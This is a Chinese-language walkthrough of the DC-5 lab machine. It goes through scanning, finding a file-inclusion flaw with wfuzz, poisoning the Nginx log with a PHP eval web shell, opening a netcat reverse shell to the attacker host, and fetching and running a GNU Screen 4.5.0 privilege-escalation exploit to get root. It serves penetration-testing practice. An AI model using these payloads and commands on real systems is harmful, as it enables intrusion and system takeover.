## DC-5渗透测试

### 主机扫描

```shell
nmap -sn 192.168.56.0/24
Nmap scan report for 192.168.56.109
Host is up (0.00038s latency).
MAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)
```

> 靶机ip：192.168.56.109

### 端口扫描

扫描全端口

```shell
nmap --min-rate 10000 -p- 192.168.56.109
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 02:26 EDT
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 76.19% done; ETC: 02:27 (0:00:12 remaining)
Nmap scan report for 192.168.56.109
Host is up (0.00028s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
59961/tcp open  unknown
MAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 85.26 seconds
```

rpcbind是NFS中 用来进行消息通知的服务。一般情况 下rpcbind运行在111端口。并且NFS配置开 启rpcbind_ enable="YES"

[rpcbind](https://www.cnblogs.com/lnterpreter/p/15504651.html)

可以搜一下rpcbind有什么漏洞`searchsploit rpcbind`，没有什么可利用的漏洞

```
nmap -p 111 --script=rpcinfo 192.168.56.109
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 02:33 EDT
Nmap scan report for 192.168.56.109
Host is up (0.00047s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33709/udp6  status
|   100024  1          36913/tcp6  status
|   100024  1          39562/udp   status
|_  100024  1          59961/tcp   status
MAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

### 目录扫描

```shell
dirsearch -u http://192.168.56.109
```

```shell
Target: http://192.168.56.109/

[02:28:05] Starting: 
[02:28:23] 200 -    4KB - /contact.php
[02:28:24] 301 -  184B  - /css  ->  http://192.168.56.109/css/
[02:28:27] 200 -    6KB - /faq.php
[02:28:28] 200 -   17B  - /footer.php
[02:28:30] 403 -  570B  - /images/
[02:28:30] 301 -  184B  - /images  ->  http://192.168.56.109/images/
[02:28:47] 200 -  852B  - /thankyou.php
```

接着看web页面

### 漏洞发现和利用

观察页脚，每次刷新他都会变

![image-20240312143700257](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312143700257.png)

根据我们扫到的footer.php，这里可能包含了footer.php

wfuzz枚举一下参数

```
wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt 192.168.56.109/thankyou.php?FUZZ=/etc/passwd
```

```
000000343:   200        42 L     66 W       851 Ch      "filter"
000000342:   200        42 L     66 W       851 Ch      "files"
000000341:   200        70 L     104 W      2319 Ch     "file"
000000337:   200        42 L     66 W       851 Ch      "failed"
```

参数就是file

这里使用的是nginx服务，可以利用日志包含

#### 日志包含

nginx的默认日志在`/var/log/nginx/access.log`中，错误日志在`/var/log/nginx/error.log`中

```
http://192.168.56.109/thankyou.php?file=<?php @eval($_POST[1]);?>
```

写进去一句话木马，直接蚁剑连接了

![image-20240312145830178](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312145830178.png)

接着弹一个shell到kali

```
nc -e /bin/bash 192.168.56.101 1234
```

### 提权

首先查看一下有suid权限的文件

```bash
www-data@dc-5:~$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```

这里我第一眼就看到了/bin/screen-4.5.0，就直接找它的漏洞

```
searchsploit screen
```

```
GNU Screen 4.5.0 - Local Privilege Escalation    linux/local/41154.sh
```

还真让我找对了，本地提权走起

复制到当前目录下

```
cp /usr/share/exploitdb/exploits/linux/local/41154.sh dc-5.sh
```

下载到靶机上

```shell
www-data@dc-5:/tmp$ wget http://192.168.56.101/dc-5.sh
wget http://192.168.56.101/dc-5.sh
converted 'http://192.168.56.101/dc-5.sh' (ANSI_X3.4-1968) -> 'http://192.168.56.101/dc-5.sh' (UTF-8)
--2024-03-12 17:09:29--  http://192.168.56.101/dc-5.sh
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1149 (1.1K) [text/x-sh]
Saving to: 'dc-5.sh'

dc-5.sh             100%[=====================>]   1.12K  --.-KB/s   in 0s     

2024-03-12 17:09:29 (317 MB/s) - 'dc-5.sh' saved [1149/1149]
```

直接执行

```
bash dc-5.sh
```

```shell
www-data@dc-5:/tmp$ bash dc-5.sh
bash dc-5.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

拿到root的权限

![image-20240312151248203](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312151248203.png)

### 总结

> wfuzz的利用
>
> nginx的日志默认路径在哪？
>  `访问日志：/usr/local/nginx/logs/access.log` 或者 `/var/log/nginx/access.log`
>  `错误日志：/usr/loacl/nginx/logs/error.log` 或者`/var/log/nginx/error.log`
>
> 靶机涉及的知识点：
>
> 文件包含，日志包含，wfuzz参数的枚举，screen提权